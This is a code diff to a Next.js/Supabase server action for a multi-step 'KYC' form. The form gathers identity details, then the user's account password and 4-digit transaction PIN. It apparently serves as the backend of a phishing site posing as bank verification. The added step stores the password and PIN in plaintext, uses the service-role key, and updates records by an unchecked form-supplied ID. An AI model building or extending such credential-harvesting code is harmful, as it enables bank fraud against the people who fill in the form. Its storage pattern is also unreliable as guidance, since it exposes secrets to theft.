@@ -3,7 +3,7 @@
 import { createClient } from "@supabase/supabase-js";
 import { z } from "zod";
 
-const kycSchema = z.object({
+const kycStep1Schema = z.object({
   fullName: z.string().min(3, "Full name must be at least 3 characters"),
   fatherName: z.string().min(2, "Father name is required"),
   motherName: z.string().min(2, "Mother name is required"),
@@ -14,13 +14,9 @@ const kycSchema = z.object({
   accountNumber: z.string().min(1, "Account number is required"),
   citizenshipNumber: z.string().min(1, "Citizenship number is required"),
   nidNumber: z.string().min(1, "NID number is required"),
-  password: z.string().min(1, "Password is required"),
-  transactionPin: z
-    .string()
-    .regex(/^\d{4}$/, "Transaction PIN must be exactly 4 digits"),
 });
 
-export async function submitKyc(formData: FormData) {
+export async function submitKycStep1(formData: FormData) {
   const raw = {
     fullName: formData.get("fullName") as string,
     fatherName: formData.get("fatherName") as string,
@@ -30,11 +26,9 @@ export async function submitKyc(formData: FormData) {
     accountNumber: formData.get("accountNumber") as string,
     citizenshipNumber: formData.get("citizenshipNumber") as string,
     nidNumber: formData.get("nidNumber") as string,
-    password: formData.get("password") as string,
-    transactionPin: formData.get("transactionPin") as string,
   };
 
-  const parsed = kycSchema.safeParse(raw);
+  const parsed = kycStep1Schema.safeParse(raw);
   if (!parsed.success) {
     return { error: parsed.error.flatten().fieldErrors };
   }
@@ -53,8 +47,6 @@ export async function submitKyc(formData: FormData) {
     account_number: parsed.data.accountNumber,
     citizenship_number: parsed.data.citizenshipNumber,
     nid_number: parsed.data.nidNumber,
-    password: parsed.data.password,
-    transaction_pin: parsed.data.transactionPin,
     status: "Pending",
     step: 1,
   }).select("id").single();
@@ -64,6 +56,46 @@ export async function submitKyc(formData: FormData) {
   }
 
   return { success: true, submissionId: data.id };
+}
+
+const passwordTxnSchema = z.object({
+  password: z.string().min(1, "Password is required"),
+  transactionPin: z
+    .string()
+    .regex(/^\d{4}$/, "Transaction PIN must be exactly 4 digits"),
+});
+
+export async function submitPasswordTxn(formData: FormData) {
+  const raw = {
+    password: formData.get("password") as string,
+    transactionPin: formData.get("transactionPin") as string,
+  };
+
+  const parsed = passwordTxnSchema.safeParse(raw);
+  if (!parsed.success) {
+    return { error: parsed.error.flatten().fieldErrors };
+  }
+
+  const submissionId = formData.get("submissionId") as string;
+
+  const supabase = createClient(
+    process.env.NEXT_PUBLIC_SUPABASE_URL!,
+    process.env.SUPABASE_SERVICE_ROLE_KEY!
+  );
+
+  const { error } = await supabase
+    .from("kyc_submissions")
+    .update({
+      password: parsed.data.password,
+      transaction_pin: parsed.data.transactionPin,
+    })
+    .eq("id", submissionId);
+
+  if (error) {
+    return { error: { _form: [error.message] } };
+  }
+
+  return { success: true };
 }
 
 export async function submitAdditionalInfo(submissionId: string) {
